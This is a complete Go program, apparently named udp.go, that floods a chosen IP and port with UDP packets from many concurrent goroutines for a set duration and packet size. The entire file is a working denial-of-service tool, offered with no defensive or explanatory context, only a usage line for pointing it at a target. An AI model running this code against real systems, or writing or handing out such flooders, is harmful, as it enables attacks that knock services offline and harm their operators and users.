package main

import (
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 6 {
		println("Usage: go run udp.go <target_ip> <target_port> <num_connections> <duration> <packet_length>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		println("Invalid port number:", err)
		os.Exit(1)
	}

	numConnections, err := strconv.Atoi(os.Args[3])
	if err != nil {
		println("Invalid number of connections:", err)
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil {
		println("Invalid duration:", err)
		os.Exit(1)
	}

	packetLength, err := strconv.Atoi(os.Args[5])
	if err != nil {
		println("Invalid packet length:", err)
		os.Exit(1)
	}

	addr := net.JoinHostPort(targetIP, strconv.Itoa(targetPort))

	var wg sync.WaitGroup
	for i := 0; i < numConnections; i++ {
		wg.Add(1)
		go sendUDPPackets(&wg, addr, duration, packetLength)
	}

	wg.Wait()
}

func sendUDPPackets(wg *sync.WaitGroup, addr string, duration, packetLength int) {
	defer wg.Done()

	udpPayload := make([]byte, packetLength)
	for i := range udpPayload {
		udpPayload[i] = 'X'
	}

	timeout := time.Duration(duration) * time.Second
	endTime := time.Now().Add(timeout)

	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()

	startTime := time.Now()
	for time.Now().Before(endTime) {
		_, err := conn.Write(udpPayload)
		if err != nil {
			continue
		}
	}

	time.Sleep(endTime.Sub(startTime))
}
